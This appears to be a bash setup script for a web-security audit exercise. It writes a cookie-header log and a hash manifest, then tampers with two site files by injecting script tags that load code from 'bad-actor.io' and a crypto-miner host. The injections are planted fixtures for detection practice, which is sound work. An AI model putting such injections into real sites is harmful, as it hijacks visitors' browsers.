#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y python3 python3-pip
pip3 install pytest

useradd -m -s /bin/bash user || true

mkdir -p /home/user/audit/www/js

cat << 'EOF' > /home/user/audit/headers.log
Endpoint: /api/v1/auth
HTTP/1.1 200 OK
Set-Cookie: session_id=abc1234; Secure; HttpOnly; SameSite=Strict
Content-Type: application/json

Endpoint: /api/v1/profile
HTTP/1.1 200 OK
Set-Cookie: user_prefs=darkmode; Secure
Content-Type: application/json

Endpoint: /api/v1/dashboard
HTTP/1.1 200 OK
Content-Type: text/html

Endpoint: /api/v1/legacy_login
HTTP/1.1 200 OK
Set-Cookie: token=xyz987; Path=/
Content-Type: application/json
EOF

echo "<html><body>Hello</body></html>" > /home/user/audit/www/about.html
echo "<html><head></head><body>Home</body></html>" > /home/user/audit/www/index.html
echo "console.log('app');" > /home/user/audit/www/js/app.js
echo "console.log('utils');" > /home/user/audit/www/js/utils.js

cd /home/user/audit/www
sha256sum about.html js/utils.js > /home/user/audit/manifest.sha256
echo "1111111111111111111111111111111111111111111111111111111111111111  index.html" >> /home/user/audit/manifest.sha256
echo "2222222222222222222222222222222222222222222222222222222222222222  js/app.js" >> /home/user/audit/manifest.sha256

echo "<html><head><script src=\"https://bad-actor.io/hook.js\"></script></head><body>Home</body></html>" > /home/user/audit/www/index.html
echo "console.log('app'); document.write('<script src=\"https://crypto-miner.com/mine.js\"></script>');" > /home/user/audit/www/js/app.js

chmod -R 777 /home/user
chmod 644 /home/user/audit/www/about.html
chmod 666 /home/user/audit/www/index.html
chmod 644 /home/user/audit/www/js/app.js
chmod 644 /home/user/audit/www/js/utils.js
